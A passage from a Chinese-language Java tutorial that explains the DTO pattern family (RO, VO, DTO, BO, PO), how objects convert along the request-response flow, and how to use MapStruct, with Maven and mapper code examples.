<h4 id="1-1-5-校验规则冲突-Validation-Rule-Conflicts"><a href="#1-1-5-校验规则冲突-Validation-Rule-Conflicts" class="headerlink" title="1.1.5 校验规则冲突 (Validation Rule Conflicts)"></a>1.1.5 校验规则冲突 (Validation Rule Conflicts)</h4><ul>
<li><strong>详细说明</strong>：同一个业务实体，在不同的业务场景下（如创建、更新），其字段的校验规则是截然不同的。</li>
<li><strong>灾难场景</strong>：我们尝试用同一个 <code>User</code> 类来处理所有请求。<ul>
<li><strong>创建用户时</strong>：<code>username</code> 和 <code>password</code> 都是必填的 (<code>@NotBlank</code>)。</li>
<li><strong>更新用户信息时</strong>：<code>username</code> 可能不允许修改，而 <code>password</code> 是可选的（用户不一定想改密码）。</li>
<li>如果用一个类，这些 <code>@NotBlank</code> 注解该如何安放？你会陷入复杂的 <code>if-else</code> 逻辑或混乱的 <code>Validation Groups</code> 中，代码可读性和可维护性极差。</li>
</ul>
</li>
<li><strong>DTO的价值</strong>：为不同场景创建不同的请求对象（RO）是最佳实践。例如：<ul>
<li><code>UserCreateRO</code>：包含 <code>username</code> 和 <code>password</code> 字段，都用 <code>@NotBlank</code> 标记。</li>
<li><code>UserProfileUpdateRO</code>：只包含 <code>nickname</code>, <code>bio</code> 等允许修改的字段。</li>
<li><code>UserPasswordChangeRO</code>：包含 <code>oldPassword</code>, <code>newPassword</code> 字段。</li>
<li>每个类各司其职，校验规则清晰明了，代码结构优雅健壮。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-解决方案：DTO模式-Data-Transfer-Object"><a href="#1-2-解决方案：DTO模式-Data-Transfer-Object" class="headerlink" title="1.2 解决方案：DTO模式 (Data Transfer Object)"></a>1.2 解决方案：DTO模式 (Data Transfer Object)</h3><p>面对“单一模型”带来的种种弊端，软件设计领域早已给出了成熟的解决方案——<strong>DTO（数据传输对象）模式</strong>。它不仅仅是一个技术名词，更是一种分层架构的设计哲学。</p>
<h4 id="1-2-1-定义与核心职责"><a href="#1-2-1-定义与核心职责" class="headerlink" title="1.2.1 定义与核心职责"></a>1.2.1 定义与核心职责</h4><ul>
<li><strong>定义</strong>:<br>DTO（Data Transfer Object）是一个简单的、没有业务逻辑的纯数据载体对象（POJO - Plain Old Java Object）。它的唯一使命就是在系统的不同层级之间，或者在不同的微服务之间，高效、安全地传递数据。</li>
<li><strong>核心职责</strong>:<br>DTO 就像一个专业的“数据摆渡车”或“集装箱”。它的职责非常纯粹：<ol>
<li><strong>数据聚合 (Aggregation)</strong>：从多个源（如多个PO）收集数据，打包成一个方便消费者使用的对象。</li>
<li><strong>数据裁剪 (Trimming)</strong>：只包含特定场景下需要的数据，剔除所有无关、敏感的字段。</li>
<li><strong>结构转换 (Transformation)</strong>：将底层的、规范化的数据结构，转换成上层（如视图层）需要的、可能是扁平化或非规范化的结构。</li>
<li><strong>契约定义 (Contract Definition)</strong>：作为服务提供方（后端）与服务消费方（前端或其它服务）之间的数据契约。只要这个DTO不变，内部实现可以自由重构。</li>
<li><strong>解耦 (Decoupling)</strong>：它是隔离内部实现细节与外部接口的关键屏障，使得各层可以独立演进和测试。</li>
</ol>
</li>
</ul>
<hr>
<h4 id="1-2-2-DTO-家族"><a href="#1-2-2-DTO-家族" class="headerlink" title="1.2.2 DTO 家族"></a>1.2.2 DTO 家族</h4><p>虽然广义上它们都可以被称为 DTO，但在现代分层架构实践中，为了更精确地表达意图，我们通常会对它们进行细分。它们在经典的**“Controller-Service-Repository”**三层架构中扮演着不同的角色：</p>
<ul>
<li><strong>RO (Request Object) &#x2F; Form &#x2F; Command</strong><ul>
<li><strong>层级</strong>: <strong>Controller 层（入参）</strong></li>
<li><strong>作用</strong>: 专门用于封装客户端（如浏览器、App）发起的 HTTP 请求体（通常是 JSON）。它是 Controller 方法的参数。</li>
<li><strong>特点</strong>:<ul>
<li>字段与请求体一一对应。</li>
<li><strong>是参数校验（Validation）的主要阵地</strong>。通常会使用 <code>javax.validation</code>（如 <code>@NotBlank</code>, <code>@Email</code>, <code>@Size</code>）或 <code>jakarta.validation</code> 的注解来声明校验规则。</li>
<li>例如：<code>UserCreateRO</code>, <code>OrderSubmitRO</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>VO (View Object)</strong><ul>
<li><strong>层级</strong>: <strong>Controller 层（出参）</strong></li>
<li><strong>作用</strong>: 专门用于封装需要返回给客户端的数据。它是 Controller 方法的返回值，最终会被序列化为 JSON 响应。</li>
<li><strong>特点</strong>:<ul>
<li><strong>面向展示</strong>：字段名对前端友好（如 <code>createTime</code> 变成 <code>createdAt</code>），数据格式为前端所需（如时间戳转为格式化字符串）。</li>
<li><strong>数据安全</strong>：不包含任何敏感信息，所有需要脱敏的数据都已处理完毕。</li>
<li>结构可能经过聚合或扁平化，以方便前端直接渲染。</li>
<li>例如：<code>UserProfileVO</code>, <code>ProductDetailVO</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>DTO (Data Transfer Object)</strong> - <em>狭义上的 DTO</em><ul>
<li><strong>层级</strong>: <strong>Service 层（内部流通）</strong></li>
<li><strong>作用</strong>: Service 层对外提供服务（给 Controller 或其他 Service 调用）时使用的数据传输对象，同时也作为 Service 方法内部处理数据的载体。</li>
<li><strong>特点</strong>:<ul>
<li><strong>业务中立</strong>：它是对业务领域核心概念的一种数据表达，相对稳定，不随前端视图的改变而改变。</li>
<li>是 PO 与 VO&#x2F;RO 之间的核心桥梁。转换逻辑通常是 <code>RO -&gt; DTO</code>，然后 <code>DTO -&gt; PO</code>；或者 <code>PO -&gt; DTO</code>，然后 <code>DTO -&gt; VO</code>。</li>
<li>封装了较为完整的数据，但隐藏了持久化的细节。</li>
<li>例如：<code>UserDTO</code>, <code>OrderDTO</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>BO (Business Object)</strong><ul>
<li><strong>层级</strong>: <strong>Service 层 &#x2F; Domain 层</strong></li>
<li><strong>作用</strong>: 业务对象，它与 DTO 的区别在于，<strong>BO 不仅包含数据，还封装了业务逻辑</strong>。它是有行为的。在复杂的领域驱动设计（DDD）中，BO 是核心。</li>
<li><strong>特点</strong>:<ul>
<li>在更复杂的业务系统中，Service 层会先将 DTO 转换为 BO，然后调用 BO 上的方法来执行业务操作，BO 自身的状态会发生改变。</li>
<li>它体现了面向对象的封装思想，将数据和操作数据的行为绑定在一起。</li>
<li>例如：一个 <code>OrderBO</code> 对象，可能有一个 <code>.cancel()</code> 方法，该方法内部包含了取消订单的所有业务规则检查和状态变更逻辑。</li>
</ul>
</li>
<li><strong>注意</strong>: 在很多业务不那么复杂的“贫血模型”项目中，BO 和 DTO 的界限可能比较模糊，甚至直接使用 DTO 来承载所有业务数据，而将业务逻辑全部放在 Service 方法中。</li>
</ul>
</li>
</ul>
<p><strong>总结一下它们的关系：</strong></p>
<p>前端通过 <code>RO</code> 发起请求 -&gt; Controller 将 <code>RO</code> 转为 <code>DTO</code> 并调用 Service -&gt; Service (可能)将 <code>DTO</code> 转为 <code>BO</code> 执行业务逻辑，并操作 <code>PO</code> 与数据库交互 -&gt; Service 将 <code>PO</code> 转为 <code>DTO</code> 作为结果返回 -&gt; Controller 将 <code>DTO</code> 转为 <code>VO</code> 返回给前端。</p>
<hr>
<h3 id="1-3-对象转换的生命周期（请求-响应全流程）"><a href="#1-3-对象转换的生命周期（请求-响应全流程）" class="headerlink" title="1.3 对象转换的生命周期（请求-响应全流程）"></a>1.3 对象转换的生命周期（请求-响应全流程）</h3><h4 id="1-3-1-请求旅程-Inbound-从浏览器到数据库"><a href="#1-3-1-请求旅程-Inbound-从浏览器到数据库" class="headerlink" title="1.3.1 请求旅程 (Inbound): 从浏览器到数据库"></a>1.3.1 请求旅程 (Inbound): 从浏览器到数据库</h4><p>这条路径描述了数据如何从用户的操作，最终被持久化到数据库中。</p>
<p><strong>1. <code>JSON -&gt; Controller(RO)</code>：反序列化与校验</strong></p>
<ul>
<li><strong>发生了什么？</strong> 当用户在前端点击“注册”按钮时，浏览器将表单数据打包成一个 JSON 字符串，通过 HTTP POST 请求发送到后端。Spring MVC 框架（或同类框架）的 <code>MessageConverter</code>（通常是 Jackson）自动拦截到这个 JSON 字符串。</li>
<li><strong>转换过程</strong>：框架根据 Controller 方法参数上的 <code>@RequestBody</code> 注解，将 JSON 字符串<strong>反序列化</strong>成一个 <code>UserCreateRO</code> 对象。紧接着，如果参数上还有 <code>@Valid</code> 注解，框架会立即对这个 <code>RO</code> 对象执行<strong>参数校验</strong>。</li>
<li><strong>职责</strong>: 框架负责将非结构化的文本转换为结构化的 Java 对象，并执行第一道防线——输入验证。</li>
</ul>
<p><strong>2. <code>Controller(RO) -&gt; Service(DTO)</code>：意图转换</strong></p>
<ul>
<li><strong>发生了什么？</strong> Controller 确认 <code>RO</code> 对象合法后，它的职责就快完成了。它需要调用 Service 层来执行真正的业务逻辑。但是，Controller 不应该直接把 <code>RO</code> 传递给 Service。</li>
<li><strong>转换过程</strong>：在 Controller 方法内部，我们主动调用转换工具（如 MapStruct），将 <code>UserCreateRO</code> 对象转换为 <code>UserDTO</code> 对象。这个过程可能不是简单的属性复制，例如 <code>RO</code> 中的 <code>password</code> 和 <code>confirmPassword</code>，在 <code>DTO</code> 中可能只需要一个 <code>password</code> 字段。</li>
<li><strong>职责</strong>: <strong>这是我们作为开发者编写的第一次转换</strong>。目的是将“面向接口的、包含校验规则的”请求对象，转换为“面向业务的、干净的”数据传输对象，解耦 Controller 与 Service。</li>
</ul>
<p><strong>3. <code>Service(DTO) -&gt; Repository(PO)</code>：持久化准备</strong></p>
<ul>
<li><strong>发生了什么？</strong> Service 层接收到 <code>UserDTO</code>，执行了一系列业务逻辑（例如检查用户名是否已存在）。当所有逻辑通过，准备将新用户存入数据库时，它需要与 Repository 层交互。</li>
<li><strong>转换过程</strong>：Service 层调用转换工具，将 <code>UserDTO</code> 转换为 <code>User</code> 实体（PO）。这个过程可能会为 PO 设置一些默认值或内部状态，比如 <code>createTime</code>, <code>status</code>, 或者通过算法生成 <code>salt</code> 并哈希 <code>password</code>。</li>
<li><strong>职责</strong>: 将业务数据模型转换为持久化数据模型，为 ORM 框架的操作做好准备。</li>
</ul>
<p><strong>4. <code>Repository(PO) -&gt; DB</code>：最终入库</strong></p>
<ul>
<li><strong>发生了什么？</strong> Service 调用 <code>userRepository.save(user)</code>。</li>
<li><strong>转换过程</strong>：JPA&#x2F;Hibernate 或 MyBatis 等 ORM 框架接管这个 <code>User</code> PO 对象，解析其上的 <code>@Entity</code>, <code>@Column</code> 等注解，生成一条 SQL <code>INSERT</code> 语句，并执行它。</li>
<li><strong>职责</strong>: ORM 框架负责将 Java 对象的状态映射到数据库表的记录中。</li>
</ul>
<hr>
<h4 id="1-3-2-响应旅程-Outbound-从数据库到浏览器"><a href="#1-3-2-响应旅程-Outbound-从数据库到浏览器" class="headerlink" title="1.3.2 响应旅程 (Outbound): 从数据库到浏览器"></a>1.3.2 响应旅程 (Outbound): 从数据库到浏览器</h4><p>这条路径描述了数据如何从数据库中被查询出来，并最终呈现在用户眼前。</p>
<p><strong>1. <code>DB -&gt; Repository(PO)</code>：数据映射</strong></p>
<ul>
<li><strong>发生了什么？</strong> 我们需要查询一个用户信息，于是调用 <code>userRepository.findById(1L)</code>。</li>
<li><strong>转换过程</strong>：ORM 框架向数据库发送一条 SQL <code>SELECT</code> 语句，获取查询结果（一个或多个数据行）。然后，框架根据 <code>User</code> 类的映射配置，将查询结果的每一列数据填充到一个新的 <code>User</code> PO 对象中。</li>
<li><strong>职责</strong>: ORM 框架负责将数据库的表记录反向映射为 Java 对象。</li>
</ul>
<p><strong>2. <code>Repository(PO) -&gt; Service(DTO)</code>：业务封装</strong></p>
<ul>
<li><strong>发生了什么？</strong> Service 层从 Repository 获取到了一个或多个 <code>PO</code> 对象。这些 <code>PO</code> 可能包含了懒加载的关联对象或内部字段，不适合直接向外暴露。</li>
<li><strong>转换过程</strong>：Service 层调用转换工具，将 <code>User</code> PO 转换为 <code>UserDTO</code>。这个过程是<strong>非常关键的业务聚合点</strong>。例如，除了转换 <code>User</code> 的基本信息，可能还会额外查询用户的角色信息（<code>Role</code> PO），并将其一并设置到 <code>UserDTO</code> 中。</li>
<li><strong>职责</strong>: 将底层的、可能不完整的持久化对象，封装成一个信息完备、边界清晰的业务数据对象。</li>
</ul>
<p><strong>3. <code>Service(DTO) -&gt; Controller(VO)</code>：视图裁剪与美化</strong></p>
<ul>
<li><strong>发生了什么？</strong> Controller 从 Service 层获取了 <code>UserDTO</code>，现在需要准备一个对前端友好的响应。</li>
<li><strong>转换过程</strong>：Controller 调用转换工具，将 <code>UserDTO</code> 转换为 <code>UserVO</code>。这个过程是数据的“最后一公里”。它会：<ul>
<li><strong>裁剪</strong>：只保留前端需要的字段。</li>
<li><strong>脱敏</strong>：将手机号 <code>13812345678</code> 转换为 <code>138****5678</code>。</li>
<li><strong>格式化</strong>：将 <code>Date</code> 对象转换为 <code>yyyy-MM-dd HH:mm:ss</code> 格式的字符串。</li>
<li><strong>重命名</strong>：将 <code>isDeleted</code> 字段转换为前端更喜欢的 <code>deleted</code>。</li>
</ul>
</li>
<li><strong>职责</strong>: 将内部的业务数据模型，转换为面向外部的、安全的、格式化的视图模型。</li>
</ul>
<p><strong>4. <code>Controller(VO) -&gt; JSON</code>：序列化</strong></p>
<ul>
<li><strong>发生了什么？</strong> Controller 方法返回 <code>UserVO</code> 对象。</li>
<li><strong>转换过程</strong>：框架（通过 Jackson）接管这个 <code>VO</code> 对象，将其<strong>序列化</strong>为一个 JSON 字符串，然后放入 HTTP 响应体中，发送回客户端。</li>
<li><strong>职责</strong>: 框架负责将结构化的 Java 对象转换为非结构化的文本，以便在网络上传输。</li>
</ul>
<hr>
<h2 id="2-主流对象转换工具横评"><a href="#2-主流对象转换工具横评" class="headerlink" title="2. 主流对象转换工具横评"></a>2. 主流对象转换工具横评</h2><h3 id="2-1-MapStruct"><a href="#2-1-MapStruct" class="headerlink" title="2.1 MapStruct"></a>2.1 MapStruct</h3><h4 id="2-1-1-核心思想"><a href="#2-1-1-核心思想" class="headerlink" title="2.1.1 核心思想"></a>2.1.1 核心思想</h4><p>MapStruct 是一个基于注解处理的 Java Bean 映射工具。它的核心哲学是 <strong>“约定优于配置”</strong> 和 <strong>“编译时生成代码”</strong>。</p>
<p>你只需要定义一个 <code>Mapper</code> 接口，并用注解声明映射规则。在项目编译时，MapStruct 会自动为你生成该接口的<strong>具体实现类</strong>。这个实现类包含了所有必需的 <code>getter/setter</code> 调用，没有任何反射，因此其<strong>运行时性能与手写代码几乎完全相同</strong>。这种方式既保证了极致的性能，又提供了类型安全的保障——任何映射错误都会在编译期被发现，而不是在运行时作为 Bug 出现。</p>
<hr>
<h4 id="2-1-2-快速上手"><a href="#2-1-2-快速上手" class="headerlink" title="2.1.2 快速上手"></a>2.1.2 快速上手</h4><p><strong>第一步：引入依赖 (以 Maven 为例)</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">org.mapstruct.version</span>&gt;</span>1.5.5.Final<span class="tag">&lt;/<span class="name">org.mapstruct.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mapstruct<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapstruct<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;org.mapstruct.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span> <span class="comment">&lt;!-- or higher --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span> <span class="comment">&lt;!-- or higher --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">annotationProcessorPaths</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mapstruct<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapstruct-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;org.mapstruct.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- other annotation processors, e.g. lombok --&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">annotationProcessorPaths</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>关键点</strong>: <code>mapstruct-processor</code> 是在 <code>maven-compiler-plugin</code> 中配置的，它负责在编译阶段生成代码。</p>
</blockquote>
<p><strong>第二步：定义数据模型和 Mapper 接口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PO - 持久化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="comment">// getters and setters...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VO - 视图对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserVO</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long userId;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String registrationDate; <span class="comment">// 注意，类型和名称都不同</span></span><br><span class="line">    <span class="comment">// getters and setters...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mapper 接口</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserConverter</span> &#123;</span><br><span class="line">    <span class="comment">// 获取实例的推荐方式</span></span><br><span class="line">    <span class="type">UserConverter</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> Mappers.getMapper(UserConverter.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;id&quot;, target = &quot;userId&quot;)</span></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;name&quot;, target = &quot;username&quot;)</span></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;createTime&quot;, target = &quot;registrationDate&quot;, dateFormat = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line">    <span class="meta">@Mapping(target = &quot;email&quot;, ignore = true)</span> <span class="comment">// 明确忽略 email 字段，保证安全</span></span><br><span class="line">    UserVO <span class="title function_">toVO</span><span class="params">(User user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第三步：使用</strong></p>
<p>编译项目后，MapStruct 会在 <code>target/generated-sources/annotations/</code> 目录下生成一个 <code>UserConverterImpl.java</code> 文件。你可以像使用普通 Java 类一样使用它：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(); <span class="comment">// ... set properties</span></span><br><span class="line"><span class="type">UserVO</span> <span class="variable">userVO</span> <span class="operator">=</span> UserConverter.INSTANCE.toVO(user);</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-3-核心用法与注解"><a href="#2-1-3-核心用法与注解" class="headerlink" title="2.1.3 核心用法与注解"></a>2.1.3 核心用法与注解</h4><ul>
<li><p><strong><code>@Mapping(source = &quot;...&quot;, target = &quot;...&quot;)</code></strong>: 这是最核心的注解，用于处理源对象和目标对象之间属性名或类型不匹配的情况。</p>
<ul>
<li><strong><code>source = &quot;name&quot;, target = &quot;username&quot;</code></strong>: 当属性名不同时使用。</li>
<li><strong><code>source = &quot;profile.avatar&quot;</code></strong>: 支持嵌套源属性。它会自动生成 <code>source.getProfile().getAvatar()</code> 这样的代码。</li>
<li><strong><code>target = &quot;email&quot;, ignore = true</code></strong>: 当你不想映射某个目标字段时，明确忽略它。这是一个好习惯，可以防止意外暴露数据。</li>
<li><strong><code>dateFormat = &quot;...&quot;</code></strong>: 当源和目标分别是 <code>Date</code>&#x2F;<code>LocalDateTime</code> 和 <code>String</code> 时，用于指定格式化模式。</li>
<li><strong><code>constant = &quot;...&quot;</code></strong>: 为目标字段设置一个固定的常量值。例如 <code>@Mapping(target = &quot;userType&quot;, constant = &quot;NORMAL_USER&quot;)</code>。</li>
</ul>
</li>
<li><p><strong><code>@InheritInverseConfiguration</code></strong>: 用于自动创建反向映射，极大减少重复代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserConverter</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(source = &quot;id&quot;, target = &quot;userId&quot;)</span></span><br><span class="line">    <span class="meta">@Mapping(source = &quot;name&quot;, target = &quot;username&quot;)</span></span><br><span class="line">    UserVO <span class="title function_">toVO</span><span class="params">(User user)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@InheritInverseConfiguration</span></span><br><span class="line">    User <span class="title function_">toEntity</span><span class="params">(UserVO userVO)</span>; <span class="comment">// MapStruct会自动应用 toVO 方法的逆向规则</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>expression = &quot;java(...)&quot;</code></strong>: 当映射逻辑无法通过简单 <code>source-target</code> 表达时，使用 Java 表达式。这赋予了 MapStruct 极高的灵活性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source: User(firstName, lastName)</span></span><br><span class="line"><span class="comment">// Target: UserDTO(fullName)</span></span><br><span class="line"><span class="meta">@Mapping(target = &quot;fullName&quot;, expression = &quot;java(user.getFirstName() + \&quot; \&quot; + user.getLastName())&quot;)</span></span><br><span class="line">UserDTO <span class="title function_">toDTO</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>defaultValue = &quot;...&quot;</code></strong>: 当源属性为 <code>null</code> 时，为目标属性提供一个默认值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapping(source = &quot;avatarUrl&quot;, target = &quot;avatarUrl&quot;, defaultValue = &quot;default-avatar.png&quot;)</span></span><br><span class="line">UserDTO <span class="title function_">toDTO</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="2-1-4-进阶技巧"><a href="#2-1-4-进阶技巧" class="headerlink" title="2.1.4 进阶技巧"></a>2.1.4 进阶技巧</h4><ul>
<li><p><strong><code>uses = {OtherConverter.class}</code></strong>: 当转换涉及到其他复杂类型时，可以复用别的 <code>Converter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Order 包含 User 对象</span></span><br><span class="line"><span class="meta">@Mapper(uses = UserConverter.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderConverter</span> &#123;</span><br><span class="line">    <span class="comment">// MapStruct 知道如何将 Order.user 转换为 OrderVO.userVO，</span></span><br><span class="line">    <span class="comment">// 因为它会去调用 UserConverter.toVO()</span></span><br><span class="line">    OrderVO <span class="title function_">toVO</span><span class="params">(Order order)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@MappingTarget</code></strong>: 用于<strong>更新</strong>一个已存在的对象，而不是每次都创建新对象。这在处理 JPA 实体更新时非常有用，可以利用 JPA 的“脏检查”机制。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Controller中的更新方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">(Long id, UserUpdateRO ro)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userRepository.findById(id).orElseThrow();</span><br><span class="line">    <span class="comment">// user 是一个持久态对象</span></span><br><span class="line">    userConverter.updateUserFromRO(ro, user);</span><br><span class="line">    <span class="comment">// userRepository.save(user); // 由于是持久态，此行可省略，事务提交时会自动更新</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Converter 接口</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserConverter</span> &#123;</span><br><span class="line">    <span class="comment">// MapStruct 会将 ro 的属性值更新到 user 对象上</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">updateUserFromRO</span><span class="params">(UserUpdateRO ro, <span class="meta">@MappingTarget</span> User user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@BeanMapping(ignoreByDefault = true)</code></strong>: 一种更安全的映射策略（“白名单模式”）。默认忽略所有属性的映射，你必须用 <code>@Mapping</code> 手动指定要映射的字段。这可以防止因为新增字段而意外地映射了不该映射的数据。</p>
